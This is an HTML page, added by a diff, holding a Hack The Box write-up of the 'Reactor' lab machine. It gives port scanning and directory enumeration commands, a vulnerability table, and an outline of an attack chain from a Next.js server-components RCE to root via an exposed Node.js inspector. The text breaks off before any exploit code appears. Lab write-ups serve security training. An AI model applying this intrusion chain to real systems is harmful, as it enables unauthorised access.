@@ -1,0 +1,1614 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="HTB Write-ups & Penetration Testing">
+      
+      
+        <meta name="author" content="Franksimon">
+      
+      
+        <link rel="canonical" href="https://franciscosimonwasel.github.io/security-portfolio/HTB/Reactor/">
+      
+      
+        <link rel="prev" href="../Redeemer/">
+      
+      
+        <link rel="next" href="../Principal/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Reactor - Francisco Simon — Security Portfolio</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/css/custom.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#htb-machine-report-reactor" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Francisco Simon — Security Portfolio" class="md-header__button md-logo" aria-label="Francisco Simon — Security Portfolio" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Francisco Simon — Security Portfolio
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Reactor
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../Meow/" class="md-tabs__link">
+          
+  
+  
+  HTB Write-ups
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Francisco Simon — Security Portfolio" class="md-nav__button md-logo" aria-label="Francisco Simon — Security Portfolio" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Francisco Simon — Security Portfolio
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HTB Write-ups
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    HTB Write-ups
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Meow/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Meow
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Fawn/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fawn
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Dancing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dancing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Redeemer/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Redeemer
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reactor
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reactor
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-executive-summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Executive Summary
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21-port-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1 Port Scan
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22-reconocimiento-web-puerto-3000" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2 Reconocimiento Web — Puerto 3000
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#23-enumeracion-de-directorios" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.3 Enumeración de Directorios
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#24-identificacion-de-version-nextjs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.4 Identificación de versión Next.js
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-vulnerability-identification" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Vulnerability Identification
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Vulnerability Identification">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cve-2025-55182-nextjs-react-server-components-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CVE-2025-55182 — Next.js React Server Components RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Exploitation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41-initial-access-cve-2025-55182-nextjs-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.1 Initial Access — CVE-2025-55182 (Next.js RCE)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42-reconocimiento-post-explotacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.2 Reconocimiento Post-Explotación
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#43-cracking-de-hashes-md5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.3 Cracking de Hashes MD5
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#44-acceso-ssh-como-engineer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.4 Acceso SSH como engineer
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-post-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Post-Exploitation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Post-Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#51-user-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.1 User Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-privilege-escalation-nodejs-inspector-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Privilege Escalation — Node.js Inspector Abuse
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6. Privilege Escalation — Node.js Inspector Abuse">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#61-enumeracion-de-privilegios" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.1 Enumeración de Privilegios
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#62-proceso-root-con-nodejs-inspector" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.2 Proceso root con Node.js Inspector
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#63-explotacion-del-inspector" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.3 Explotación del Inspector
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52-root-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.2 Root Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-remediation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Remediation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-lessons-learned" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Lessons Learned
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9. References
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Principal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Principal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Pirate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pirate
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-executive-summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Executive Summary
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21-port-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1 Port Scan
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22-reconocimiento-web-puerto-3000" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2 Reconocimiento Web — Puerto 3000
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#23-enumeracion-de-directorios" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.3 Enumeración de Directorios
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#24-identificacion-de-version-nextjs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.4 Identificación de versión Next.js
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-vulnerability-identification" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Vulnerability Identification
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Vulnerability Identification">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cve-2025-55182-nextjs-react-server-components-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CVE-2025-55182 — Next.js React Server Components RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Exploitation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41-initial-access-cve-2025-55182-nextjs-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.1 Initial Access — CVE-2025-55182 (Next.js RCE)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42-reconocimiento-post-explotacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.2 Reconocimiento Post-Explotación
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#43-cracking-de-hashes-md5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.3 Cracking de Hashes MD5
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#44-acceso-ssh-como-engineer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.4 Acceso SSH como engineer
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-post-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Post-Exploitation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Post-Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#51-user-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.1 User Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-privilege-escalation-nodejs-inspector-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Privilege Escalation — Node.js Inspector Abuse
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6. Privilege Escalation — Node.js Inspector Abuse">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#61-enumeracion-de-privilegios" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.1 Enumeración de Privilegios
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#62-proceso-root-con-nodejs-inspector" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.2 Proceso root con Node.js Inspector
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#63-explotacion-del-inspector" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.3 Explotación del Inspector
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52-root-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.2 Root Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-remediation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Remediation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-lessons-learned" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Lessons Learned
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9. References
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="htb-machine-report-reactor">HTB Machine Report — Reactor</h1>
+<p><strong>Date:</strong> 2026-05-25
+<strong>Author:</strong> Franksimon
+<strong>Platform:</strong> Hack The Box
+<strong>Difficulty:</strong> EASY
+<strong>OS:</strong> Linux
+<strong>IP:</strong> 10.129.6.85
+<strong>Status:</strong> Pwned</p>
+<hr />
+<h2 id="1-executive-summary">1. Executive Summary</h2>
+<p>Reactor es una máquina Linux que expone una aplicación web Next.js 15.0.3 vulnerable a ejecución remota de código (CVE-2025-55182) mediante prototype pollution en React Server Components. El acceso inicial se obtiene como usuario <code>node</code>. Posteriormente se descubren credenciales en una base de datos SQLite que permiten acceso SSH como <code>engineer</code>. La escalación a root se logra abusando del modo de debugging de Node.js (<code>--inspect</code>) que corre como root con el puerto 9229 expuesto localmente, permitiendo ejecutar código arbitrario en el contexto del proceso privilegiado.</p>
+<p><strong>Cadena de ataque:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>RCE via CVE-2025-55182 → shell como node → SQLite DB → credenciales SSH → engineer → Node.js inspector → root
+</code></pre></div></p>
+<hr />
+<h2 id="2-enumeration">2. Enumeration</h2>
+<h3 id="21-port-scan">2.1 Port Scan</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-p-<span class="w"> </span>-sS<span class="w"> </span>-sV<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-T4<span class="w"> </span><span class="m">10</span>.129.6.85
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>State</th>
+<th>Service</th>
+<th>Version</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22/tcp</td>
+<td>open</td>
+<td>SSH</td>
+<td>OpenSSH 9.6p1 Ubuntu</td>
+</tr>
+<tr>
+<td>3000/tcp</td>
+<td>open</td>
+<td>HTTP</td>
+<td>Next.js 15.0.3</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>TTL=63 → Linux</li>
+<li>Puerto 3000 identificado por nmap como <code>ppp?</code> pero el fingerprint HTTP revela headers de Next.js</li>
+</ul>
+<h3 id="22-reconocimiento-web-puerto-3000">2.2 Reconocimiento Web — Puerto 3000</h3>
+<p>Accediendo a <code>http://10.129.6.85:3000</code> se encuentra <strong>ReactorWatch Core Monitoring System v3.2.1</strong> — un dashboard de monitoreo de un reactor nuclear.</p>
+<p><img alt="ReactorWatch Dashboard" src="../screenshots/dashboard.png" /></p>
+<p><strong>Tecnologías identificadas con Wappalyzer:</strong>
+- Next.js 15.0.3
+- React
+- Node.js</p>
+<p><strong>Personal visible en la aplicación (posibles usernames):</strong>
+- Dr. Elena Rodriguez — Lead Nuclear Engineer — ONLINE
+- Marcus Kim — Senior Technician — ONLINE
+- James Thompson — Safety Officer — OFFLINE</p>
+<p><img alt="Wappalyzer + Personnel" src="../screenshots/wappalyzer_personnel.png" /></p>
+<p><strong>Footer:</strong> <code>REACTORWATCH™ © 2025 NUCLEAR DYNAMICS CORP. | FACILITY: SITE-7 | CLASSIFICATION: RESTRICTED</code></p>
+<h3 id="23-enumeracion-de-directorios">2.3 Enumeración de Directorios</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://10.129.6.85:3000<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/common.txt<span class="w"> </span>-x<span class="w"> </span>js,json,txt<span class="w"> </span>-t<span class="w"> </span><span class="m">100</span>
+</code></pre></div>
+<p>Sin resultados relevantes — falsos positivos del wordlist.</p>
+<h3 id="24-identificacion-de-version-nextjs">2.4 Identificación de versión Next.js</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>http://10.129.6.85:3000<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oP<span class="w"> </span><span class="s1">&#39;/_next/static/chunks/[^&quot;]+\.js&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-10
+</code></pre></div>
+<p>Confirmada versión <strong>Next.js 15.0.3</strong> por Wappalyzer y headers HTTP.</p>
+<hr />
+<h2 id="3-vulnerability-identification">3. Vulnerability Identification</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Vulnerability</th>
+<th>CVE</th>
+<th>CVSS</th>
+<th>Location</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Next.js RSC RCE via Prototype Pollution</td>
+<td>CVE-2025-55182</td>
+<td>9.8</td>
+<td>Puerto 3000</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Credenciales en base de datos SQLite sin cifrar</td>
+<td>—</td>
+<td>7.5</td>
+<td><code>/opt/reactor-app/reactor.db</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>Hash MD5 sin salt (débil)</td>
+<td>—</td>
+<td>6.0</td>
+<td>reactor.db → tabla users</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Node.js inspector expuesto como root</td>
+<td>—</td>
+<td>9.0</td>
+<td>127.0.0.1:9229</td>
+</tr>
+</tbody>
+</table>
+<h3 id="cve-2025-55182-nextjs-react-server-components-rce">CVE-2025-55182 — Next.js React Server Components RCE</h3>
+<p><strong>Concepto:</strong> Next.js 15.0.3 y versiones anteriores son vulnerables a prototype pollution en el mecanismo de React Server Components (RSC). Un atacante puede manipular el prototipo de objetos JavaScript para inyectar propiedades maliciosas que se ejecutan durante el procesamiento de componentes del servidor. Esto permite RCE en el contexto del proceso Node.js que sirve la aplicación.</p>
+<p><strong>Por qué es explotable:</strong> Los RSC procesan datos del cliente sin validación suficiente del prototipo de los objetos recibidos. Al contaminar <code>Object.prototype</code>, el payload se propaga a cualquier operación que herede de ese prototipo durante el ciclo de render del servidor.</p>
+<hr />
+<h2 id="4-exploitation">4. Exploitation</h2>
+<h3 id="41-initial-access-cve-2025-55182-nextjs-rce">4.1 Initial Access — CVE-2025-55182 (Next.js RCE)</h3>
+<p><strong>Preparación del exploit:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Instalar dependencias en entorno virtual</span>
